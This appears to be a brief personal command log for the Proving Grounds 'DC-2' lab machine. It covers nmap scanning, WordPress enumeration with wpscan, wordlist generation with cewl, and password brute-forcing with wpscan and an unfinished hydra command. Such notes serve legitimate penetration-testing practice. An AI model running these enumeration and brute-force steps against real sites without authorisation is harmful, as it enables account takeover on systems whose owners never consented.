# Create variable for target VM
TARGET_IP="192.168.200.194"
WORKING_DIR="/home/brian/Documents/ProvingGrounds/DC-2/"

# nmap
nmap $TARGET_IP -sC -sV -O -A -p 80,7744 -oN scan.txt

# Add the target IP to /etc/hosts
echo "$TARGET_IP dc-2" | sudo tee -a /etc/hosts

# Use wp-scan to enumerate the target
wpscan --enumerate --url http://dc-2 | tee wpscan.txt

# Use cewl to create a wordlist
cewl -d 3 -w ./cewl-passwords.txt http://dc-2


wpscan --passwords ./cewl-passwords.txt --url http://dc-2

# Hydra
hydra -L users.txt -P passwords.txt


